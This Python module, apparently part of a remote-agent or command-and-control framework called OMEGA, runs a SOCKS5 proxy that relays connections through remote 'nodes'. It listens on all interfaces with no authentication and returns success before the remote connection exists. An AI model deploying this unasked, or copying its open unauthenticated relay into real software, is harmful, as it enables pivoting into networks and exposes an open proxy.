import asyncio
import struct
import logging
from typing import Dict

log = logging.getLogger("OMEGA.socks")

class SocksSession:
    def __init__(self, port: int, node_id: str, manager):
        self.port = port
        self.node_id = node_id
        self.manager = manager
        self.server = None
        self.active_conns: Dict[int, asyncio.StreamWriter] = {}
        self.conn_counter = 0

    async def start(self):
        try:
            self.server = await asyncio.start_server(self.handle_client, '0.0.0.0', self.port)
            log.info(f"SOCKS5 Server started for node {self.node_id} on port {self.port}")
            async with self.server:
                await self.server.serve_forever()
        except Exception as e:
            log.error(f"SOCKS5 Server error: {e}")

    async def handle_client(self, reader, writer):
        conn_id = self.conn_counter
        self.conn_counter += 1
        self.active_conns[conn_id] = writer
        
        try:
            # 1. SOCKS5 Handshake
            # [VER, NMETHODS, METHODS]
            header = await reader.readexactly(2)
            ver, nmethods = struct.unpack("!BB", header)
            if ver != 0x05:
                writer.close()
                return
            
            methods = await reader.readexactly(nmethods)
            # Send [VER, METHOD] (0x00 = No Auth)
            writer.write(struct.pack("!BB", 0x05, 0x00))
            await writer.drain()

            # 2. SOCKS5 Request
            # [VER, CMD, RSV, ATYP, DST.ADDR, DST.PORT]
            req_header = await reader.readexactly(4)
            ver, cmd, rsv, atyp = struct.unpack("!BBBB", req_header)
            
            if cmd != 0x01: # Only CONNECT supported
                writer.write(struct.pack("!BBBBIH", 0x05, 0x07, 0x00, 0x01, 0, 0)) # Command not supported
                await writer.drain()
                writer.close()
                return

            dst_addr = ""
            if atyp == 0x01: # IPv4
                dst_addr = ".".join(map(str, await reader.readexactly(4)))
            elif atyp == 0x03: # Domain
                domain_len = (await reader.readexactly(1))[0]
                dst_addr = (await reader.readexactly(domain_len)).decode()
            elif atyp == 0x04: # IPv6
                dst_addr = ":" .join([f"{x:x}" for x in struct.unpack("!8H", await reader.readexactly(16))])

            dst_port = struct.unpack("!H", await reader.readexactly(2))[0]

            log.info(f"[SOCKS] Node {self.node_id} requested connect to {dst_addr}:{dst_port}")

            # Notify Agent to open connection
            await self.manager.send_to_node(self.node_id, {
                "t": "socks_open",
                "id": conn_id,
                "addr": dst_addr,
                "port": dst_port
            })

            # Send SOCKS5 Success response (Browser expects this before sending data)
            # [VER, REP, RSV, ATYP, BND.ADDR, BND.PORT]
            writer.write(struct.pack("!BBBBIH", 0x05, 0x00, 0x00, 0x01, 0, 0))
            await writer.drain()

            # 3. Data Forwarding Loop
            while True:
                data = await reader.read(16384)
                if not data:
                    break
                await self.manager.send_to_node(self.node_id, {
                    "t": "socks_data",
                    "id": conn_id,
                    "data": data.hex() # Send as hex to avoid JSON issues
                })

        except Exception as e:
            log.error(f"[SOCKS] Session {conn_id} error: {e}")
        finally:
            log.info(f"[SOCKS] Session {conn_id} closed")
            await self.manager.send_to_node(self.node_id, {"t": "socks_close", "id": conn_id})
            self.active_conns.pop(conn_id, None)
            writer.close()

    def handle_data_from_node(self, conn_id: int, data_hex: str):
        if conn_id in self.active_conns:
            try:
                data = bytes.fromhex(data_hex)
                self.active_conns[conn_id].write(data)
                # Note: This is sync in writer, but we are in async context
            except Exception as e:
                log.error(f"[SOCKS] Error writing to client {conn_id}: {e}")

    def stop(self):
        if self.server:
            self.server.close()
            log.info(f"SOCKS5 Server for node {self.node_id} stopped")

class SocksManager:
    def __init__(self, broker_manager):
        self.sessions: Dict[str, SocksSession] = {} # node_id -> SocksSession
        self.broker = broker_manager

    async def start_socks(self, node_id: str, port: int):
        if node_id in self.sessions:
            self.sessions[node_id].stop()
        
        session = SocksSession(port, node_id, self.broker)
        self.sessions[node_id] = session
        asyncio.create_task(session.start())
        return f"SOCKS5 Proxy active on port {port}"

    def stop_socks(self, node_id: str):
        if node_id in self.sessions:
            self.sessions[node_id].stop()
            del self.sessions[node_id]
            return "SOCKS5 Proxy stopped"
        return "No active proxy for this node"

    def handle_agent_data(self, node_id: str, conn_id: int, data_hex: str):
        if node_id in self.sessions:
            self.sessions[node_id].handle_data_from_node(conn_id, data_hex)
